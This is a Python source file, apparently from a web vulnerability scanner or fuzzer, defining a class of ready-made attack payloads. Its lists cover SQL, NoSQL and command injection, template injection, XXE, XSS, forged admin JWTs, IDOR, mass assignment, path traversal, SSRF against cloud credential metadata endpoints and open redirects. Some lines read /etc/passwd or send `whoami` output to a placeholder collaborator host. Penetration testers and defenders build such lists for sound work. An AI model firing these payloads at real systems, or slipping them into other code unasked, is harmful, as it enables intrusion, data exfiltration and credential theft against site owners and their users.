class Payloads():
    def __init__(self):
        self.sql_injection = [
                "'", "''", "--", "#", "/**/",
                "' OR '1'='1", "' OR 1=1--", "' OR 'x'='x",
                "admin'--", "' OR 1=1#",
                "' AND SLEEP(5)--",                     
                "'; WAITFOR DELAY '0:0:5'--",               
                "' AND (SELECT pg_sleep(5))--",             
                "' AND 1=1--", "' AND 1=2--", 
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            ]

        self.nosql_injection = [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$ne": "invalid"}',
                '{"$regex": ".*"}',
                '{"$where": "sleep(5000)"}',
                '{"$or": [{"a":"a"}]}',
                '{"$in": [""]}',
                "[$ne]=invalid",
                "[$gt]=",
                "[$regex]=.*",
            ]

        self.command_injection = [
                "; ls", "| ls", "`ls`", "$(ls)",
                "; id", "| id", "`id`", "$(id)",
                "; cat /etc/passwd",
                "$(cat /etc/passwd)",
                "& dir", "| dir", "& whoami",
                "; curl http://your-collaborator.com/$(whoami)",
                "; ping -c 1 your-collaborator.com",
                ";l's'", "|w'h'oami", "$(wh\toami)",
            ]

        self.ssti = [
                "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "${7*7}", "${'x'*7}", "${class.getResource('')}",
                "<%= 7*7 %>", "<%= system('id') %>",
                "{$smarty.version}", "{7*7}",
                "#set($x=7*7)${x}",
                "#{7*7}", "%{7*7}",
            ]

        self.xxe = [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-collaborator.com/xxe">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg>&xxe;</svg>',
            ]

        self.xss = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<script>alert`1`</script>",
                '"><script>alert(1)</script>',
                "'><img src=x onerror=alert(1)>",
                "#<script>alert(1)</script>",
                "';alert(1)//",
                "<img src=x id=xss onerror=alert(document.domain)>",
            ]

        self.jwt_attacks = [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
                "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.invalid_signature",
                "null", "undefined", "Bearer null", "Bearer undefined",
                "Bearer ", "",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            ]

        self.api_key_bypass = [
                "", "null", "undefined", "test", "demo",
                "00000000-0000-0000-0000-000000000000",
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                "invalid_key_12345",
            ]

        self.idor = [
                "0", "1", "2", "3", "100", "999", "9999", "99999",
                "-1", "-2",
                "null", "undefined", "true", "false",
                "00000000-0000-0000-0000-000000000000",
                "11111111-1111-1111-1111-111111111111",
                "me", "self", "current", "my",
                "../1", "../2", "1/../2",
                '{"id": 1}', '{"id": "$ne"}',
            ]

        self.mass_assignment = [
                '{"role": "admin"}',
                '{"role": "superuser"}',
                '{"isAdmin": true}',
                '{"is_admin": true}',
                '{"admin": true}',
                '{"verified": true}',
                '{"active": true}',
                '{"email_verified": true}',
                '{"balance": 99999}',
                '{"credits": 99999}',
                '{"discount": 100}',
                '{"permissions": ["read","write","admin","delete"]}',
                '{"scope": "admin"}',
                '{"group": "admins"}',
            ]

        self.graphql = [
                '{"query": "{__schema{types{name fields{name}}}}"}',
                '{"query": "{__typename}"}',
                '{"query": "query IntrospectionQuery{__schema{queryType{name}}}"}',
                '{"query": "{ users { id email password role } }"}',
                '{"query": "{ user(id: 1) { id email password } }"}',
                '[{"query":"{__typename}"},{"query":"{__typename}"}]',
                '{"query": "{ usr { id } }"}',
            ]

        self.path_traversal = [
                "../", "../../", "../../../",
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\", "..\\..\\", "..\\..\\..\\windows\\win.ini",
                "../../../etc/passwd%00",
                "../../../etc/passwd\x00",
                "..%252f..%252f..%252fetc%252fpasswd",
            ]

        self.ssrf = [
                "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
                "http://[::1]",
                "http://127.0.0.1:80", "http://127.0.0.1:8080", "http://127.0.0.1:8443",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "dict://127.0.0.1:11211/", "gopher://127.0.0.1:6379/_PING",
                "file:///etc/passwd",
            ]

        self.open_redirect = [
                "https://evil.com", "//evil.com", "///evil.com",
                "/\\evil.com", "https:evil.com",
                "javascript:alert(1)",
                "%0d%0ahttps://evil.com", 
            ]

        
        self.overflow = [
                "A" * 100, "A" * 1000, "A" * 10000,
                "A" * 100000,
                "\x00" * 100,                  
                "\xFF" * 100,                   
                "%s" * 20, "%n" * 20,           
                "{{" * 20, "}}" * 20,           
            ]

        self.type_confusion = [
                # JSON type juggling
                "true", "false", "null",
                "0", "1", "-1",
                "[]", "{}",
                "[1,2,3]",
                '{"key": "value"}',
                "1.0", "1e10",
                # PHP loose comparison
                "0e123456",
                "0x1A",
            ]